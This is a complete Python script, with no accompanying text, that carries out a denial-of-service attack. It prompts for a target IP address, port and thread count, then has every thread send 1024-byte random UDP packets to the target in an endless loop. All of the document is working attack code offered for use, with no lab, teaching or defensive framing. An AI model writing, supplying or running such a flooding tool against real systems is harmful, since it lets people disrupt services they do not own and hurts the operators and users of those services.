import socket
import random
import threading

def dos_attack(target_ip, target_port, num_threads):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)

    def attack_thread():
        while True:
            try:
                sock.sendto(data, (target_ip, target_port))
                print(f"sent packet to {target_ip}:{target_port}")
            except Exception as e:
                print(f"error: {e}")

    for _ in range(num_threads):
        thread = threading.Thread(target=attack_thread)
        thread.start()

if __name__ == "__main__":
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    num_threads = int(input("Enter the number of threads: "))
    dos_attack(target_ip, target_port, num_threads)
